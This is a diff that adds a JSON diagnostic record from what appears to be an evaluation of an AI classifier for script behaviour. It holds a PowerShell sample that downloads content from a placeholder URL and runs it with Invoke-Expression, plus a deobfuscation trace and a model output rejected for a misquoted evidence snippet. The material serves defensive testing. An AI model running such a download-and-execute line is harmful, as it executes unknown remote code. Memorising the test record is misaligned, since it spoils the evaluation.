@@ -1,0 +1,225 @@
+{
+  "packet_version": "semantic-readiness-v1",
+  "id": "09-download-invoke-P0",
+  "stage": "diagnostic_development",
+  "raw_artifact": "artifacts/pre_phase4/diagnostics_v3/results/09-download-invoke-P0.json",
+  "raw_sha256": "e166f1f9271d4c199f59e9826c0731de409b0450bd46891d9b2f8c15db9d2b96",
+  "original": "$code = (Invoke-WebRequest -Uri 'https://example.invalid/readiness/7319').Content\nInvoke-Expression $code",
+  "original_sha256": "ed626e24ff7d4ff56de8bba23d95924ddaba9e0d775d355d05706597530bf165",
+  "deterministic_recovery_posthoc_not_sent_to_historical_B": {
+    "schema_version": "deobfuscation-v1",
+    "engine_version": "static-subset-v1",
+    "input_sha256": "ed626e24ff7d4ff56de8bba23d95924ddaba9e0d775d355d05706597530bf165",
+    "source_name": "input",
+    "input_provenance": "original",
+    "status": "partial",
+    "semantic_equivalence": "not_claimed",
+    "limits": {
+      "max_input_bytes": 1048576,
+      "max_artifact_bytes": 262144,
+      "max_total_artifact_bytes": 2097152,
+      "max_transformations": 512,
+      "max_depth": 3,
+      "max_expression_depth": 24,
+      "max_concat_terms": 128,
+      "max_tokens": 50000,
+      "max_work_units": 4000000,
+      "max_unresolved": 128
+    },
+    "layers": [
+      {
+        "layer_id": "L0",
+        "source_name": "input",
+        "provenance": "original",
+        "text": "$code = (Invoke-WebRequest -Uri 'https://example.invalid/readiness/7319').Content\nInvoke-Expression $code",
+        "depth": 0,
+        "parent_transformation_id": null,
+        "root_source": null
+      }
+    ],
+    "transformations": [
+      {
+        "transformation_id": "T0001",
+        "technique": "OT-VARSUB",
+        "source": {
+          "layer_id": "L0",
+          "start": 100,
+          "end": 105,
+          "line": 2,
+          "column": 19,
+          "end_line": 2,
+          "end_column": 24
+        },
+        "root_source": {
+          "layer_id": "L0",
+          "start": 100,
+          "end": 105,
+          "line": 2,
+          "column": 19,
+          "end_line": 2,
+          "end_column": 24
+        },
+        "original_fragment": "$code",
+        "provenance": "deobfuscator_recovered",
+        "recovery_kind": "unresolved",
+        "recovered_text": null,
+        "recovered_bytes_base64": null,
+        "dependencies": [],
+        "status": "failed",
+        "deterministic_verified": false,
+        "warnings": [
+          "No unambiguous prior literal binding in the supported scope."
+        ],
+        "added_operation": null,
+        "output_layer_id": null
+      }
+    ],
+    "unresolved": [
+      {
+        "source": {
+          "layer_id": "L0",
+          "start": 8,
+          "end": 81,
+          "line": 1,
+          "column": 9,
+          "end_line": 1,
+          "end_column": 82
+        },
+        "technique_hint": null,
+        "reason": "Only literal strings and explicitly supported expressions can be recovered.",
+        "transformation_id": null
+      },
+      {
+        "source": {
+          "layer_id": "L0",
+          "start": 0,
+          "end": 81,
+          "line": 1,
+          "column": 1,
+          "end_line": 1,
+          "end_column": 82
+        },
+        "technique_hint": "OT-VARSUB",
+        "reason": "Assignment is not a unique literal binding in the supported linear scope.",
+        "transformation_id": null
+      },
+      {
+        "source": {
+          "layer_id": "L0",
+          "start": 100,
+          "end": 105,
+          "line": 2,
+          "column": 19,
+          "end_line": 2,
+          "end_column": 24
+        },
+        "technique_hint": "OT-VARSUB",
+        "reason": "No unambiguous prior literal binding in the supported scope.",
+        "transformation_id": "T0001"
+      }
+    ],
+    "techniques_detected": [
+      "OT-VARSUB"
+    ],
+    "limits_hit": [],
+    "warnings": [],
+    "work_units": 144,
+    "artifact_bytes": 5
+  },
+  "reference": {
+    "labels": [
+      "B01",
+      "B02"
+    ],
+    "human_approved": false
+  },
+  "reference_basis": "predeclared AI-assisted synthetic development reference, not independent ground truth",
+  "model_parsed_claims": {
+    "behaviors": [
+      {
+        "behavior_id": "B02",
+        "confidence": "high",
+        "evidence": [
+          {
+            "snippet": "Invoke-WebRequest -Uri 'https://example.invalid/readiness/7319'.Content",
+            "source_id": "original"
+          },
+          {
+            "snippet": "Invoke-Expression $code",
+            "source_id": "original"
+          }
+        ],
+        "explanation": "The script performs a remote retrieval by fetching content from 'https://example.invalid/readiness/7319' and then executes the retrieved content using Invoke-Expression. This constitutes functional evaluation and invocation of loaded code."
+      }
+    ],
+    "limitations": [
+      "The specific content of the remote URL is unknown and unverified.",
+      "The exact behavior of the executed code is unknown as it is dynamically loaded.",
+      "The URL 'https://example.invalid' is not a verified legitimate service."
+    ],
+    "obfuscation_techniques": [],
+    "prompt_injection": {
+      "detected": false,
+      "notes": "No adversarial instructions detected in the provided code.",
+      "snippets": []
+    },
+    "recovered_content": [],
+    "risk_label": "suspicious",
+    "risk_rationale": "The script performs remote code execution (RCE) by downloading and executing an arbitrary script from an unverified external URL. This pattern is consistent with abuse-compatible operations such as malware delivery or lateral movement. The risk is elevated due to the combination of remote retrieval and immediate execution of unknown content.",
+    "uncertainty": {
+      "level": "high",
+      "notes": "The actual payload executed is unknown. The script may be benign (e.g., a configuration check) or malicious (e.g., a dropper). Without the remote content, the specific intent cannot be confirmed.",
+      "uninterpretable_fragments": []
+    }
+  },
+  "predicted_labels": [
+    "B02"
+  ],
+  "model_recovered_content_status": "unverified_model_claims_never_certified",
+  "objective_literal_checks": [
+    {
+      "finding_index": 0,
+      "claimed_source": "original",
+      "snippet": "Invoke-WebRequest -Uri 'https://example.invalid/readiness/7319'.Content",
+      "declared_source_literal_match": false,
+      "occurrences_in_declared_source": 0,
+      "literal_in_original": false,
+      "deterministic_source_matches_posthoc": [],
+      "semantic_support": "not_adjudicated"
+    },
+    {
+      "finding_index": 0,
+      "claimed_source": "original",
+      "snippet": "Invoke-Expression $code",
+      "declared_source_literal_match": true,
+      "occurrences_in_declared_source": 1,
+      "literal_in_original": true,
+      "deterministic_source_matches_posthoc": [],
+      "semantic_support": "not_adjudicated"
+    }
+  ],
+  "current_application_structural_validation": {
+    "applicable": false,
+    "accepted": null
+  },
+  "historical_error": {
+    "code": "invalid_response",
+    "message": "Nonexistent evidence in source original"
+  },
+  "historical_truncated": false,
+  "AI_assistance": {
+    "kind": "AI_assisted_diagnostic_observation",
+    "not_human_adjudication": true,
+    "text": "Rechazo por cita modificada: la expresión citada pierde los paréntesis originales antes de .Content. Solo emite B02, omitiendo B01 pese a describir la descarga. No se reconstruye la cita para hacerla pasar."
+  },
+  "human_adjudication": null,
+  "diagnostic_structural_validation": {
+    "accepted": false,
+    "error": {
+      "code": "invalid_response",
+      "message": "Nonexistent evidence in source original"
+    }
+  },
+  "profile": "P0",
+  "request_sha256": "637e00f04b84c885b48f56a943dc263388c41bfc0a39b52725d6b68d52deee36"
+}
